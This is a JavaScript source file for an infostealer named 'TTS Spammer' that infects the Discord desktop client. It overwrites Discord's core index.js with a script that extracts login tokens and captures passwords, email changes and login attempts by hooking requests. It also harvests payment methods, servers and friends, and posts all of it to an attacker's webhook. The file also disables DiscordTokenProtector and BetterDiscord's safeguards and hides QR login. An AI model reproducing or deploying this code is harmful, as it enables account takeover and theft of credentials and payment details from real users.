const child_process = require('child_process');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const glob = require('glob');
const os = require('os');

// Konfiguration
const config = {
    webhook: "%WEBHOOK_URL%",
    api: "https://discord.com/api/v9/users/@me",
    auto_persist_startup: true,
    auto_mfa_disabler: true,
    auto_email_update: true,
    auto_user_profile_edit: true,
    gofile_download_link: "https://gofile.io/d/example",
    logout: false,
    inject_logout: true,
    logout_notify: true,
    init_notify: true,
    embed_color: 16711680,
    ping: "@everyone",
    pingVal: true,
    embed_name: "TTS Spammer Injection",
    embed_icon: "https://i.imgur.com/maMd4wO.png",
    disable_qr_code: true,
    auto_buy_nitro: false,
    buy_nitro_price: "9.99",
    nitro_type: "premium_monthly"
};

const infectedDiscord = [];

// Hardware-Utilities für Benutzer-Erkennung
const hardware = {
    GetUsers: async () => {
        try {
            const users = [];
            const userProfiles = path.join(os.homedir(), '..');
            
            if (fs.existsSync(userProfiles)) {
                const userDirs = fs.readdirSync(userProfiles, { withFileTypes: true })
                    .filter(dirent => dirent.isDirectory())
                    .map(dirent => path.join(userProfiles, dirent.name));
                
                users.push(...userDirs);
            }
            
            // Aktueller Benutzer
            users.push(os.homedir());
            
            return [...new Set(users)]; // Duplikate entfernen
        } catch (error) {
            console.error('Error getting users:', error);
            return [os.homedir()];
        }
    }
};

// Request-Utilities für Webhook
const requests = {
    Webhook: async (webhookUrl, data) => {
        try {
            await axios.post(webhookUrl, data, {
                headers: {
                    'Content-Type': 'application/json'
                }
            });
        } catch (error) {
            console.error('Webhook request failed:', error);
        }
    }
};

// Discord Injection
const injectDiscord = async (dir, injectionUrl, webhookUrl, configInject) => {
    try {
        const appDirs = glob.sync(path.join(dir, 'app-*').replace(/\\/g, '/'));
        const flattenedDirs = [];

        appDirs.forEach((coreDir) => {
            const matchedDirs = glob.sync(path.join(coreDir, 'modules', 'discord_desktop_core-*', 'discord_desktop_core').replace(/\\/g, '/'));
            flattenedDirs.push(...matchedDirs);
        });

        const applyInjection = flattenedDirs.map(async (coreDir) => {
            try {
                const initiationDir = path.join(coreDir, 'aurathemes');
                fs.mkdirSync(initiationDir, { recursive: true });

                // Erstelle die Injection direkt hier statt sie von einer URL zu laden
                const injection = createInjectionScript(webhookUrl, configInject);

                const indexJsPath = path.join(coreDir, 'index.js');
                fs.writeFileSync(indexJsPath, injection, 'utf8');

                const match = coreDir.match(/Local\\(discord|discordcanary|discordptb|discorddevelopment)\\/i);
                if (match) {
                    const appName = match[1].toLowerCase();
                    if (!infectedDiscord.includes(appName)) {
                        infectedDiscord.push(appName);
                    }
                }
            } catch (error) {
                console.error('Injection error:', error);
            }
        });

        await Promise.all(applyInjection);
    } catch (error) {
        console.error('Discord injection failed:', error);
    }
};

// BetterDiscord Bypass
const bypassBetterDiscord = (user) => {
    try {
        const bdPath = path.join(user, 'AppData', 'Roaming', 'BetterDiscord', 'data', 'betterdiscord.asar');

        if (fs.existsSync(bdPath)) {
            const txt = fs.readFileSync(bdPath, 'utf8');
            const modifiedTxt = txt.replace(/api\/webhooks/g, 'HackedByTTSSpammer');
            fs.writeFileSync(bdPath, modifiedTxt, 'utf8');
        }
    } catch (error) {
        console.error('BetterDiscord bypass failed:', error);
    }
};

// TokenProtector Bypass
const bypassTokenProtector = (user) => {
    try {
        const dir = path.join(user, 'AppData', 'Roaming', 'DiscordTokenProtector');
        const configPath = path.join(dir, 'config.json');

        // Prozesse beenden
        try {
            const processes = child_process.execSync('tasklist', { encoding: 'utf8' }).split('\n');
            processes.forEach((process) => {
                if (process.toLowerCase().includes('discordtokenprotector')) {
                    const processName = process.split(/\s+/)[0];
                    child_process.execSync(`taskkill /F /IM ${processName}`);
                }
            });
        } catch (error) {
            // Ignoriere Fehler beim Prozess-Beenden
        }

        // Dateien löschen
        ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat'].forEach((file) => {
            const filePath = path.join(dir, file);
            try {
                fs.unlinkSync(filePath);
            } catch (error) {
                // Ignoriere Fehler beim Datei-Löschen
            }
        });

        // Konfiguration modifizieren
        if (fs.existsSync(configPath)) {
            try {
                const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
                Object.assign(config, {
                    tts_spammer_is_here: 'https://github.com/SellMeFish/TTS-spammer',
                    auto_start: false,
                    auto_start_discord: false,
                    integrity: false,
                    integrity_allowbetterdiscord: false,
                    integrity_checkexecutable: false,
                    integrity_checkhash: false,
                    integrity_checkmodule: false,
                    integrity_checkscripts: false,
                    integrity_checkresource: false,
                    integrity_redownloadhashes: false,
                    iterations_iv: 364,
                    iterations_key: 457,
                    version: 69420,
                });
                fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                fs.appendFileSync(configPath, `\n\n//tts_spammer_is_here | Made by cyberseall`, 'utf8');
            } catch (error) {
                console.error('Config modification failed:', error);
            }
        }
    } catch (error) {
        console.error('TokenProtector bypass failed:', error);
    }
};

// Injection Script erstellen
const createInjectionScript = (webhookUrl, configInject) => {
    return `
const fs = require('fs');
const path = require('path');
const https = require('https');
const { BrowserWindow } = require('electron');

// Konfiguration
const config = {
    webhook: "${webhookUrl}",
    api: "${configInject.api}",
    auto_persist_startup: ${configInject.auto_persist_startup},
    auto_mfa_disabler: ${configInject.auto_mfa_disabler},
    auto_email_update: ${configInject.auto_email_update},
    auto_user_profile_edit: ${configInject.auto_user_profile_edit},
    embed_color: ${config.embed_color},
    embed_name: "${config.embed_name}",
    embed_icon: "${config.embed_icon}",
    ping: "${config.ping}",
    pingVal: ${config.pingVal},
    disable_qr_code: ${config.disable_qr_code},
    init_notify: ${config.init_notify}
};

// Injection Script für Discord
const injectionScript = \`
(() => {
    'use strict';
    
    const injectionState = {
        tokens: new Set(),
        currentToken: null,
        isInitialized: false,
        sessionData: {
            startTime: Date.now(),
            activities: [],
            keystrokes: [],
            mouseClicks: []
        }
    };

    const utils = {
        log: (message, data = null) => {
            console.log(\\\`[TTS Injection] \\\${message}\\\`, data || '');
        },
        
        sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
        
        formatTime: () => new Date().toISOString(),
        
        safeStringify: (obj) => {
            try {
                return JSON.stringify(obj, null, 2);
            } catch {
                return String(obj);
            }
        },
        
        getFingerprint: () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('TTS Spammer Fingerprint', 2, 2);
            return canvas.toDataURL();
        }
    };

    // Token Extraktor mit mehreren Methoden
    const tokenExtractor = {
        methods: [
            // Webpack chunk extraction
            () => {
                try {
                    let token = null;
                    if (window.webpackChunkdiscord_app) {
                        window.webpackChunkdiscord_app.push([
                            [Math.random()], {}, (e) => {
                                for (const module of Object.values(e.c)) {
                                    try {
                                        if (module?.exports?.default?.getToken) {
                                            token = module.exports.default.getToken();
                                            break;
                                        }
                                        if (module?.exports?.getToken) {
                                            token = module.exports.getToken();
                                            break;
                                        }
                                    } catch {}
                                }
                            }
                        ]);
                    }
                    return token;
                } catch {
                    return null;
                }
            },
            
            // LocalStorage extraction
            () => {
                try {
                    const token = localStorage.getItem('token');
                    return token ? token.replace(/"/g, '') : null;
                } catch {
                    return null;
                }
            },
            
            // SessionStorage extraction
            () => {
                try {
                    const token = sessionStorage.getItem('token');
                    return token ? token.replace(/"/g, '') : null;
                } catch {
                    return null;
                }
            }
        ],
        
        async extract() {
            for (const method of this.methods) {
                try {
                    const token = await method();
                    if (token && token.length > 50) {
                        utils.log('Token extracted successfully');
                        return token;
                    }
                } catch (error) {
                    utils.log('Token extraction method failed', error);
                }
            }
            return null;
        }
    };

    // API Client
    const apiClient = {
        async request(endpoint, options = {}) {
            const maxRetries = 3;
            let attempt = 0;
            
            while (attempt < maxRetries) {
                try {
                    const response = await fetch(endpoint, {
                        ...options,
                        headers: {
                            'Authorization': injectionState.currentToken,
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            ...options.headers
                        }
                    });
                    
                    if (response.status === 429) {
                        const retryAfter = response.headers.get('retry-after') || 1;
                        utils.log(\\\`Rate limited, waiting \\\${retryAfter}s\\\`);
                        await utils.sleep(retryAfter * 1000);
                        attempt++;
                        continue;
                    }
                    
                    return response;
                } catch (error) {
                    utils.log(\\\`API request failed (attempt \\\${attempt + 1})\\\`, error);
                    attempt++;
                    if (attempt < maxRetries) {
                        await utils.sleep(1000 * attempt);
                    }
                }
            }
            throw new Error('Max retries exceeded');
        },
        
        async getUserInfo() {
            try {
                const response = await this.request('${configInject.api}');
                return await response.json();
            } catch {
                return null;
            }
        },
        
        async getBilling() {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/billing/payment-sources');
                return await response.json();
            } catch {
                return [];
            }
        },
        
        async getGuilds() {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/guilds?with_counts=true');
                return await response.json();
            } catch {
                return [];
            }
        },
        
        async getFriends() {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/relationships');
                return await response.json();
            } catch {
                return [];
            }
        }
    };

    // Webhook Sender
    const webhookSender = {
        async send(data) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', '${webhookUrl}', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(data));
                utils.log('Webhook sent successfully');
            } catch (error) {
                utils.log('Webhook send failed', error);
            }
        },
        
        async sendTokenCapture(user, token) {
            const nitroTypes = {
                0: 'None',
                1: 'Nitro Classic', 
                2: 'Nitro',
                3: 'Nitro Basic'
            };

            const badges = {
                1: 'Discord Staff',
                2: 'Discord Partner',
                4: 'HypeSquad Events',
                8: 'Bug Hunter Level 1',
                64: 'HypeSquad Bravery',
                128: 'HypeSquad Brilliance',
                256: 'HypeSquad Balance',
                512: 'Early Supporter',
                16384: 'Bug Hunter Level 2',
                131072: 'Verified Bot Developer',
                4194304: 'Active Developer',
                262144: 'Certified Moderator'
            };

            const userBadges = [];
            if (user.public_flags) {
                for (const [flag, name] of Object.entries(badges)) {
                    if (user.public_flags & flag) {
                        userBadges.push(name);
                    }
                }
            }

            const [billing, guilds, friends] = await Promise.all([
                apiClient.getBilling(),
                apiClient.getGuilds(),
                apiClient.getFriends()
            ]);

            const paymentMethods = billing.map(method => {
                if (method.type === 1) {
                    return \\\`💳 \\\${method.brand} •••• \\\${method.last_4} (Expires: \\\${method.expires_month}/\\\${method.expires_year})\\\`;
                } else if (method.type === 2) {
                    return \\\`💰 PayPal (\\\${method.email})\\\`;
                }
                return '❓ Unknown Payment Method';
            });

            const guildCount = guilds.length;
            const ownedGuilds = guilds.filter(g => g.owner).length;
            const friendCount = friends.filter(f => f.type === 1).length;

            const embed = {
                username: '${config.embed_name}',
                avatar_url: '${config.embed_icon}',
                content: '${config.pingVal ? config.ping : ''}',
                embeds: [{
                    title: '🎯 Discord Token Captured - TTS Spammer',
                    color: ${config.embed_color},
                    thumbnail: {
                        url: user.avatar ? \\\`https://cdn.discordapp.com/avatars/\\\${user.id}/\\\${user.avatar}.png\\\` : 'https://cdn.discordapp.com/embed/avatars/0.png'
                    },
                    fields: [
                        {
                            name: '👤 User Information',
                            value: \\\`**Username:** \\\${user.username}#\\\${user.discriminator}\\\\n**ID:** \\\${user.id}\\\\n**Email:** \\\${user.email || 'None'}\\\\n**Phone:** \\\${user.phone || 'None'}\\\\n**MFA:** \\\${user.mfa_enabled ? '✅' : '❌'}\\\\n**Verified:** \\\${user.verified ? '✅' : '❌'}\\\`,
                            inline: true
                        },
                        {
                            name: '💎 Nitro & Badges',
                            value: \\\`**Nitro:** \\\${nitroTypes[user.premium_type] || 'None'}\\\\n**Badges:** \\\${userBadges.length > 0 ? userBadges.join(', ') : 'None'}\\\`,
                            inline: true
                        },
                        {
                            name: '💳 Payment Methods',
                            value: paymentMethods.length > 0 ? paymentMethods.join('\\\\n') : 'None',
                            inline: false
                        },
                        {
                            name: '📊 Statistics',
                            value: \\\`**Servers:** \\\${guildCount} (\\\${ownedGuilds} owned)\\\\n**Friends:** \\\${friendCount}\\\`,
                            inline: true
                        },
                        {
                            name: '🖥️ System Info',
                            value: \\\`**User Agent:** \\\${navigator.userAgent.substring(0, 100)}...\\\\n**Language:** \\\${navigator.language}\\\\n**Platform:** \\\${navigator.platform}\\\`,
                            inline: false
                        },
                        {
                            name: '🔑 Token',
                            value: \\\`\\\\\\\`\\\\\\\`\\\\\\\`\\\\n\\\${token}\\\\n\\\\\\\`\\\\\\\`\\\\\\\`\\\`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Made by cyberseall • TTS Spammer Injection',
                        icon_url: '${config.embed_icon}'
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            await this.send(embed);
        },
        
        async sendActivity(type, data) {
            const embed = {
                username: '${config.embed_name}',
                avatar_url: '${config.embed_icon}',
                embeds: [{
                    title: \\\`🔍 Activity Detected: \\\${type}\\\`,
                    description: utils.safeStringify(data),
                    color: 16776960,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'Made by cyberseall • TTS Spammer Activity Monitor'
                    }
                }]
            };
            
            await this.send(embed);
        }
    };

    // Hook System
    const hookSystem = {
        installAll() {
            // LocalStorage hooks
            const originalSetItem = localStorage.setItem;
            localStorage.setItem = function(key, value) {
                if (key === 'token') {
                    const token = value.replace(/"/g, '');
                    tokenProcessor.process(token);
                }
                return originalSetItem.apply(this, arguments);
            };
            
            // XMLHttpRequest hooks
            const originalOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                return originalOpen.apply(this, arguments);
            };
            
            const originalSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.send = function(data) {
                if (this._url && data) {
                    try {
                        const parsedData = JSON.parse(data);
                        
                        if (parsedData.password && parsedData.new_password) {
                            webhookSender.sendActivity('Password Change', {
                                old: parsedData.password,
                                new: parsedData.new_password
                            });
                        }
                        
                        if (parsedData.email && this._url.includes('/users/@me')) {
                            webhookSender.sendActivity('Email Change', {
                                email: parsedData.email,
                                password: parsedData.password
                            });
                        }
                        
                        if ((parsedData.login || parsedData.email) && parsedData.password) {
                            webhookSender.sendActivity('Login Attempt', {
                                login: parsedData.login || parsedData.email,
                                password: parsedData.password
                            });
                        }
                        
                    } catch {}
                }
                return originalSend.apply(this, arguments);
            };
        }
    };

    // Token Processor
    const tokenProcessor = {
        async process(token) {
            if (!token || injectionState.tokens.has(token)) return;
            
            injectionState.tokens.add(token);
            injectionState.currentToken = token;
            
            utils.log('Processing new token');
            
            const user = await apiClient.getUserInfo();
            if (!user || user.message) {
                utils.log('Invalid token or API error');
                return;
            }
            
            await webhookSender.sendTokenCapture(user, token);
            
            this.startMonitoring();
        },
        
        startMonitoring() {
            setInterval(async () => {
                const currentToken = await tokenExtractor.extract();
                if (currentToken && currentToken !== injectionState.currentToken) {
                    this.process(currentToken);
                }
            }, 5000);
        }
    };

    ${config.disable_qr_code ? `
    // QR Code Disabler
    const qrCodeDisabler = {
        start() {
            setInterval(() => {
                const selectors = [
                    '[class*="qrCode"]',
                    '[class*="qrLogin"]',
                    '[class*="qr-code"]',
                    '[data-testid="qr-code"]',
                    '.qr-code-container',
                    '#qr-code'
                ];
                
                selectors.forEach(selector => {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(el => {
                        el.style.display = 'none';
                        el.style.visibility = 'hidden';
                        el.remove();
                    });
                });
            }, 500);
        }
    };
    ` : ''}

    // Initialisierung
    const init = async () => {
        if (injectionState.isInitialized) return;
        injectionState.isInitialized = true;
        
        utils.log('TTS Spammer Discord Injection initializing...');
        
        hookSystem.installAll();
        
        ${config.disable_qr_code ? 'qrCodeDisabler.start();' : ''}
        
        await utils.sleep(2000);
        const token = await tokenExtractor.extract();
        if (token) {
            await tokenProcessor.process(token);
        }
        
        if (${config.init_notify}) {
            webhookSender.sendActivity('Injection Initialized', {
                timestamp: utils.formatTime(),
                userAgent: navigator.userAgent,
                url: window.location.href
            });
        }
        
        utils.log('TTS Spammer Discord Injection loaded successfully');
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    setTimeout(init, 3000);
})();
\`;

// Electron Main Process Hook
const originalCreateWindow = BrowserWindow.prototype.constructor;
BrowserWindow.prototype.constructor = function(...args) {
    const window = new originalCreateWindow(...args);
    
    window.webContents.on('dom-ready', () => {
        window.webContents.executeJavaScript(injectionScript);
    });
    
    return window;
};

// Module Export Hook
module.exports = require('./core.asar');
`;
};

// Hauptfunktion
module.exports = async (injectionUrl, webhookUrl, configInject = config) => {
    try {
        const users = await hardware.GetUsers();
        
        for (const user of users) {
            bypassBetterDiscord(user);
            bypassTokenProtector(user);

            const directories = [
                path.join(user, 'AppData', 'Local', 'discord'),
                path.join(user, 'AppData', 'Local', 'discordcanary'),
                path.join(user, 'AppData', 'Local', 'discordptb'),
                path.join(user, 'AppData', 'Local', 'discorddevelopment')
            ];

            for (const dir of directories) {
                if (fs.existsSync(dir)) {
                    await injectDiscord(dir, injectionUrl, webhookUrl, configInject);
                }
            }
        }

        if (infectedDiscord.length > 0) {
            try {
                await requests.Webhook(webhookUrl, {
                    embeds: [
                        {
                            title: '🎯 Discord(s) Successfully Injected - TTS Spammer',
                            description: `Infected Discord versions: ${infectedDiscord.map((name) => `\`${name}\``).join(', ')}`,
                            color: config.embed_color,
                            footer: {
                                text: 'Made by cyberseall • TTS Spammer Injection',
                                icon_url: config.embed_icon
                            },
                            timestamp: new Date().toISOString()
                        },
                    ],
                });
            } catch (error) {
                console.error('Webhook notification failed:', error);
            }
        }
        
        return infectedDiscord;
    } catch (error) {
        console.error('Injection process failed:', error);
        return [];
    }
}; 
